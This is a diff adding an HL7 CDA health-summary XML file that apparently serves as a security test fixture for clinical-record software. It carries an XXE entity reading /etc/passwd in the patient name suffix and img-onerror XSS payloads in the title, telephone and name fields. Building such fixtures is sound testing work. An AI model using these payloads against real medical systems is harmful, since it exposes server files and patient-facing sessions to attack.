@@ -1,0 +1,218 @@
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+ <!DOCTYPE html [ <!ELEMENT div ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<?xml-stylesheet type="text/xsl" href="/site_media/ccd_ccr/cda.xsl"?>
+
+<!-- Title: US_Realm_Header_Template -->
+<ClinicalDocument xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="urn:hl7-org:v3"
+	xmlns:cda="urn:hl7-org:v3" xmlns:sdtc="urn:hl7-org:sdtc">
+	<!-- ******************************************************** CDA Header
+		******************************************************** -->
+	<realmCode code="US"/>
+	<typeId root="2.16.840.1.113883.1.3" extension="POCD_HD000040"/>
+	<!-- US General Header Template -->
+	<templateId root="2.16.840.1.113883.10.20.22.1.1"/>
+	<!-- *** Note: The next templateId, code and title will differ depending
+		on what type of document is being sent. *** -->
+	<!-- conforms to the document specific requirements -->
+	<templateId root="2.16.840.1.113883.10.20.22.1.2"/>
+	<id extension="TT988" root="2.16.840.1.113883.19.5.99999.1"/>
+	<code codeSystem="2.16.840.1.113883.6.1" codeSystemName="LOINC" code="34133-9"
+		displayName="Summarization of Episode Note"/>
+	
+		<title>a&quot;&gt;&lt;img src=y onerror=pro (a&quot;&gt;&lt;img src=y onerror=prompt(1)&gt;) a. a&quot;&gt;&lt;img src=y onerror=prompt(1)&gt; a&quot;&gt;&lt;img sr: Health Summary</title>
+	
+    <effectiveTime value="20150205183117-0500"/>
+	<confidentialityCode code="N" codeSystem="2.16.840.1.113883.5.25"/>
+	<languageCode code="en-US"/>
+    <!--
+	<setId extension="sTT988" root="2.16.840.1.113883.19.5.99999.19"/>
+	<versionNumber value="1"/>
+    -->
+	<recordTarget>
+		<patientRole>
+            <id extension="AXAX000001" root="2.16.840.1.113883.19.5.99999.2"/>
+            
+			
+	            
+	        
+
+			
+				<addr use="HP">
+					<!-- HP is "primary home" from codeSystem 2.16.840.1.113883.5.1119 -->
+	                
+	                	<streetAddressLine nullFlavor="UNK"></streetAddressLine>
+	                
+	                
+	                	<city nullFlavor="UNK"></city>
+					
+					
+						<state nullFlavor="UNK"></state>
+					
+					
+					<postalCode nullFlavor="UNK"></postalCode>
+					
+					
+                    <country>US</country>
+					
+				</addr>
+			
+			
+			
+			<telecom value="tel:a&quot;&gt;&lt;img src=y onerror=prompt(1)&gt;" use="HP"/>
+			<!-- HP is "primary home" from HL7 AddressUse 2.16.840.1.113883.5.1119 -->
+			
+			
+			<patient>
+				
+					<name use="L">
+						<!-- L is "Legal" from HL7 EntityNameUse 2.16.840.1.113883.5.45 -->
+	                    <given>a&quot;&gt;&lt;img src=y onerror=pro</given>
+						<!-- CL is "Call me" from HL7 EntityNamePartQualifier 2.16.840.1.113883.5.43 -->
+						
+						<given>a&quot;&gt;&lt;img src=y onerror=prompt(1)&gt;</given>
+						
+						<family>a&quot;&gt;&lt;img src=y onerror=prompt(1)&gt;</family>
+						
+						<suffix>&xxe;</suffix>
+
+						
+					</name>
+				
+
+				
+	                
+	                    <administrativeGenderCode code="UN" displayName="Undifferentiated" codeSystem="2.16.840.1.113883.5.1" codeSystemName="HL7 AdministrativeGender"/>
+	                
+	            
+
+
+	            
+					
+						<birthTime nullFlavor="NI" />
+					
+				
+
+                
+				
+                
+					<!-- CDC Race and Ethnicity code set contains the minimum race and ethnicity categories defined by OMB Standards for Race and Ethnicity -->
+	                
+					<raceCode nullFlavor="NI" displayName="Unknown" codeSystem="2.16.840.1.113883.6.238" codeSystemName="Race &amp; Ethnicity - CDC"/>
+	                
+                
+
+	            
+	                
+					<ethnicGroupCode nullFlavor="NI" displayName="Unknown" codeSystem="2.16.840.1.113883.6.238" codeSystemName="Race &amp; Ethnicity - CDC"/>
+	                
+	            
+
+                
+
+				<languageCommunication>
+					
+	                    
+						<languageCode nullFlavor="NI" />
+	                    
+                    
+                    
+				</languageCommunication>
+			</patient>
+			<providerOrganization>
+				<id root="2.16.840.1.113883.4.6"/>
+                <name>s s</name>
+                <telecom use="WP" value="tel: (938) 928-3298"/>
+				<addr>
+                    <streetAddressLine></streetAddressLine>
+                    <city>None</city>
+                    <state>NY</state>
+                    <postalCode>None</postalCode>
+                    <country>US</country>
+				</addr>
+			</providerOrganization>
+		</patientRole>
+	</recordTarget>
+	<author>
+        <time value="20150205183117-0500"/>
+		<assignedAuthor>
+			<id extension="99999999" root="2.16.840.1.113883.4.6"/>
+            <code nullFlavor="NI"
+                codeSystem="2.16.840.1.113883.6.101"
+                displayName="Sleep Medicine"/>
+			<addr>
+                <streetAddressLine></streetAddressLine>
+                <city>None</city>
+                <state>NY</state>
+                <postalCode>None</postalCode>
+                <country>US</country>
+			</addr>
+            <telecom use="WP" value="tel:(938) 928-3298"/>
+			<assignedPerson>
+				<name>
+                    
+                    <given>s</given>
+                    <family>s</family>
+				</name>
+			</assignedPerson>
+		</assignedAuthor>
+	</author>
+    
+	<custodian>
+		<assignedCustodian>
+			<representedCustodianOrganization>
+				<id extension="99999999" root="2.16.840.1.113883.4.6"/>
+                <name>s s</name>
+                <telecom use="WP" value="tel: (938) 928-3298"/>
+				<addr use="WP">
+                    <streetAddressLine></streetAddressLine>
+                    <city>None</city>
+                    <state>NY</state>
+                    <postalCode>None</postalCode>
+                    <country>US</country>
+                </addr>
+			</representedCustodianOrganization>
+		</assignedCustodian>
+	</custodian>
+    
+	<documentationOf>
+		<serviceEvent classCode="PCPR">
+			<code nullFlavor="NI" codeSystem="2.16.840.1.113883.6.96"
+                codeSystemName="SNOMED CT"/>
+			<effectiveTime>
+            <low value="20150205173144-0500"/>
+			</effectiveTime>
+			<performer typeCode="PRF">
+				<functionCode code="PP" displayName="Primary Performer"
+					codeSystem="2.16.840.1.113883.12.443" codeSystemName="Provider Role">
+					<originalText>Primary Care Provider</originalText>
+				</functionCode>
+				<assignedEntity>
+					<!-- Provider NPI -->
+                    <id nullFlavor="NI" root="2.16.840.1.113883.4.6"/>
+                    <code nullFlavor="NI"
+                        codeSystem="2.16.840.1.113883.6.101" codeSystemName="Provider Codes"
+                        displayName="Sleep Medicine"/>
+                    <addr>
+                        <streetAddressLine></streetAddressLine>
+                        <city>None</city>
+                        <state>NY</state>
+                        <postalCode>None</postalCode>
+                        <country>US</country>
+                    </addr>
+                    <telecom use="WP" value="tel:(938) 928-3298"/>
+                    <assignedPerson>
+                        <name>
+                            
+                            <given>s</given>
+                            <family>s</family>
+                        </name>
+                    </assignedPerson>
+                    
+				</assignedEntity>
+			</performer>
+		</serviceEvent>
+	</documentationOf>
+	<!-- ******************************************************** CDA Body ******************************************************** -->
+	<component>
+		<structuredBody>
+ 
